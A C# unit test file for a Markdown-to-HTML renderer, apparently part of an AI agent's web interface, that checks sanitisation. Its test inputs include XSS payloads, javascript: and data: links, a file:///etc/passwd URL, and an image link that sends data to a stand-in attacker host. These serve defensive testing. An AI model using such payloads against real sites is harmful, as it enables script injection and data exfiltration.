using BlazeHarness.Web.Services;

namespace BlazeHarness.Web.Tests.Unit.Services;

public sealed class MarkdownRendererTests
{
    private readonly MarkdownRenderer _sut = new();

    [Fact]
    public void ToHtml_BasicMarkdown_Renders()
    {
        // Act
        var html = _sut.ToHtml("# Title\n\nSome **bold** text.\n\n- one\n- two");

        // Assert
        html.Should().Contain("<h1>Title</h1>").And.Contain("<strong>bold</strong>").And.Contain("<li>one</li>");
    }

    [Theory]
    [InlineData("<script>alert(1)</script>")]
    [InlineData("<img src=x onerror=alert(1)>")]
    [InlineData("<div onclick=\"x()\">hi</div>")]
    public void ToHtml_RawHtml_IsEscaped(string input)
    {
        // Act
        var html = _sut.ToHtml(input);

        // Assert
        html.Should().NotContain("<script").And.NotContain("<img").And.NotContain("<div onclick");
        html.Should().Contain("&lt;");
    }

    [Theory]
    [InlineData("[click](javascript:alert(1))")]
    [InlineData("[click](JaVaScRiPt:alert(1))")]
    [InlineData("[click](data:text/html;base64,AAAA)")]
    [InlineData("[click](vbscript:x)")]
    [InlineData("[click](/relative/path)")]
    [InlineData("<javascript:alert(1)>")]
    public void ToHtml_UnsafeLink_IsNotAnAnchor(string input)
    {
        // Act
        var html = _sut.ToHtml(input);

        // Assert
        html.Should().NotContain("<a ").And.NotContain("href=");
    }

    [Fact]
    public void ToHtml_UnsafeLink_KeepsVisibleText()
    {
        // Act
        var html = _sut.ToHtml("[click me](javascript:alert(1))");

        // Assert
        html.Should().Contain("click me");
    }

    [Theory]
    [InlineData("[site](https://example.com/a?b=1)", "https://example.com/a?b=1")]
    [InlineData("[mail](mailto:a@example.com)", "mailto:a@example.com")]
    [InlineData("<https://example.com>", "https://example.com")]
    [InlineData("see https://example.com now", "https://example.com")]
    public void ToHtml_SafeLink_OpensSafelyInANewTab(string input, string href)
    {
        // Act
        var html = _sut.ToHtml(input);

        // Assert
        html.Should().Contain($"href=\"{href}\"").And.Contain("rel=\"noopener noreferrer nofollow\"").And.Contain("target=\"_blank\"");
    }

    [Fact]
    public void ToHtml_RemoteImage_BecomesALinkAndNeverAnImageTag()
    {
        // Act
        var html = _sut.ToHtml("![a chart](https://evil.example/steal?data=secret)");

        // Assert
        html.Should().NotContain("<img");
        html.Should().Contain("<a ").And.Contain("a chart");
    }

    [Theory]
    [InlineData("out/chart.png", "api/sessions/s1/files?path=out%2Fchart.png")]
    [InlineData("/home/me/proj/chart.png", "api/sessions/s1/files?path=%2Fhome%2Fme%2Fproj%2Fchart.png")]
    [InlineData("C:/proj/chart.png", "api/sessions/s1/files?path=C%3A%2Fproj%2Fchart.png")]
    public void ToHtml_ImagePathWithASession_PointsAtTheFolderEndpoint(string path, string expected)
    {
        // Act
        var html = _sut.ToHtml($"![a chart]({path})", "s1");

        // Assert
        html.Should().Contain($"<img src=\"{expected}\"").And.Contain("alt=\"a chart\"").And.Contain("class=\"msg-image\"");
    }

    [Theory]
    [InlineData("https://evil.example/a.png")]
    [InlineData("//evil.example/a.png")]
    [InlineData("data:image/png;base64,AAAA")]
    [InlineData("file:///etc/passwd")]
    public void ToHtml_ImageThatIsAUrlWithASession_IsNeverLoaded(string url)
    {
        // Act
        var html = _sut.ToHtml($"![x]({url})", "s1");

        // Assert
        html.Should().NotContain("<img");
    }

    [Fact]
    public void ToHtml_ImagePathWithoutASession_IsNeverLoaded()
    {
        // Act
        var html = _sut.ToHtml("![x](out/chart.png)");

        // Assert
        html.Should().NotContain("<img");
    }

    [Fact]
    public void ToHtml_ImageWithUnsafeUrl_ShowsOnlyAltText()
    {
        // Act
        var html = _sut.ToHtml("![alt text](javascript:alert(1))");

        // Assert
        html.Should().NotContain("<img").And.NotContain("<a ").And.Contain("alt text");
    }

    [Fact]
    public void ToHtml_AttributeSyntax_IsNotInterpreted()
    {
        // Act
        var html = _sut.ToHtml("[link](https://example.com){onclick=\"x()\"}");

        // Assert
        html.Should().NotContain("onclick=\"x()\"");
    }

    [Fact]
    public void ToHtml_CodeBlock_HasCopyButtonAndEscapedCode()
    {
        // Act
        var html = _sut.ToHtml("```csharp\nvar x = \"<b>\";\n```");

        // Assert
        html.Should().Contain("data-copy").And.Contain("language-csharp").And.Contain("&lt;b&gt;");
    }

    [Fact]
    public void ToHtml_Table_Renders()
    {
        // Act
        var html = _sut.ToHtml("| a | b |\n|---|---|\n| 1 | 2 |");

        // Assert
        html.Should().Contain("<table>").And.Contain("<td>1</td>");
    }

    [Fact]
    public void ToHtml_Empty_ReturnsEmpty()
    {
        // Act and assert
        _sut.ToHtml(string.Empty).Should().BeEmpty();
    }

    [Fact]
    public void ToCachedHtml_SameText_ReturnsSameResult()
    {
        // Act
        var first = _sut.ToCachedHtml("some **text**");
        var second = _sut.ToCachedHtml("some **text**");

        // Assert
        second.Should().Be(first).And.Contain("<strong>text</strong>");
    }

    [Fact]
    public void ToCachedHtml_ManyDistinctTexts_StillRendersCorrectly()
    {
        // Act
        var results = Enumerable.Range(0, 600).Select(i => _sut.ToCachedHtml($"text {i}")).ToList();

        // Assert
        results[0].Should().Contain("text 0");
        results[599].Should().Contain("text 599");
        _sut.ToCachedHtml("text 0").Should().Contain("text 0");
    }

    [Fact]
    public void ToHtml_FencedCodeInKnownLanguage_IsColoredAndKeepsCopyButton()
    {
        // Act
        var html = _sut.ToHtml("```csharp\nclass A { }\n```");

        // Assert
        html.Should().Contain("<code class=\"language-csharp\">").And.Contain("tok-keyword").And.Contain("data-copy");
    }

    [Fact]
    public void ToHtml_FencedCodeInUnknownLanguage_IsShownAsPlainText()
    {
        // Act
        var html = _sut.ToHtml("```rust\nfn main() { 1 < 2 }\n```");

        // Assert
        html.Should().Contain("fn main() { 1 &lt; 2 }").And.NotContain("tok-");
    }

    [Fact]
    public void ToHtml_FencedCodeWithMarkup_CannotInjectElements()
    {
        // Act
        var html = _sut.ToHtml("```html\n<img src=x onerror=alert(1)>\n```");

        // Assert
        html.Should().NotContain("<img");
    }
}
